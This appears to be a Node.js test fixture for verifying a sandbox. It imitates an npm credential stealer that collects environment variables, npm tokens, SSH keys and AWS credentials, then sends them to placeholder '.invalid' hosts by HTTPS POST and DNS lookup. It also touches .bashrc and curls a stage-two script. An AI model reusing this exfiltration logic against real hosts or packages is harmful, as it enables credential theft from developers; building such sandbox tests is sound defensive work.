// CEA TEST FIXTURE - mimics real-world npm stealer behaviour so the sandbox can be verified.
// All endpoints use the reserved .invalid TLD: outside the sandbox nothing resolves.
const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const dns = require('dns');
const { execSync } = require('child_process');

const loot = { env: JSON.stringify(process.env), host: os.hostname() };
for (const f of ['.npmrc', '.ssh/id_rsa', '.aws/credentials']) {
  try { loot[f] = fs.readFileSync(path.join(os.homedir(), f), 'utf8'); } catch (e) {}
}
const body = Buffer.from(JSON.stringify(loot)).toString('base64');

const req = https.request({ hostname: 'collector.cea-test.invalid', path: '/c', method: 'POST' }, () => {});
req.on('error', () => {});
req.end(body);

dns.lookup(Buffer.from(process.env.NPM_TOKEN || 'none').toString('hex').slice(0, 60) + '.dns.cea-test.invalid', () => {});

try { fs.appendFileSync(path.join(os.homedir(), '.bashrc'), '\n# cea-fixture persistence\n'); } catch (e) {}
try { execSync('curl -s -m 3 http://payload.cea-test.invalid/stage2.sh -o /tmp/s2.sh'); } catch (e) {}
setTimeout(() => {}, 1500);
